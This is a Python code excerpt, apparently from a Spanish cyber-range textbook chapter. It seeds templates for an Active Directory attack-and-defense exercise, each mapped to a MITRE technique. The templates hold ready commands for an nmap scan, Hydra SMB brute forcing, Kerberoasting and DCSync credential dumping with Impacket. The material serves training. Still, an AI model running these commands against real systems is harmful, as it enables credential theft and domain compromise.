# Extraído de: LibroCyberrange/cap-15-ataques-defensa.md
# Ejemplo didáctico: seed de ActionTemplates para ejercicio AD
templates = [
    ActionTemplate(
        name="Escaneo de red con nmap",
        description="Descubrimiento de hosts y servicios en el segmento objetivo",
        default_cmd="nmap -sV -sC -p 1-65535 {target}",
        severity=1, complexity=1,
        confidentiality=1, integrity=0, availability=0,
        mitre_technique_id="T1046",
        mitre_tactic="Discovery",
        kill_chain_phase="Reconnaissance",
        tags=["network", "discovery"]
    ),
    ActionTemplate(
        name="Fuerza bruta SMB con Hydra",
        description="Ataque de diccionario contra servicio SMB",
        default_cmd="hydra -L /opt/wordlists/users.txt "
                    "-P /opt/wordlists/passwords.txt smb://{target}",
        severity=3, complexity=2,
        confidentiality=2, integrity=1, availability=1,
        mitre_technique_id="T1110.001",
        mitre_tactic="Credential Access",
        kill_chain_phase="Exploitation",
        tags=["windows", "smb", "bruteforce"]
    ),
    ActionTemplate(
        name="Kerberoasting con Impacket",
        description="Extracción de tickets TGS para cracking offline",
        default_cmd="impacket-GetUserSPNs -dc-ip {target} "
                    "DOMINIO/usuario:password -request",
        severity=4, complexity=3,
        confidentiality=3, integrity=0, availability=0,
        mitre_technique_id="T1558.003",
        mitre_tactic="Credential Access",
        kill_chain_phase="Exploitation",
        tags=["windows", "ad", "kerberos"]
    ),
    ActionTemplate(
        name="DCSync con secretsdump",
        description="Replicación de credenciales del controlador de dominio",
        default_cmd="impacket-secretsdump -just-dc {target}",
        severity=5, complexity=4,
        confidentiality=3, integrity=3, availability=1,
        mitre_technique_id="T1003.006",
        mitre_tactic="Credential Access",
        kill_chain_phase="Actions on Objectives",
        tags=["windows", "ad", "dcsync", "critical"]
    ),
]
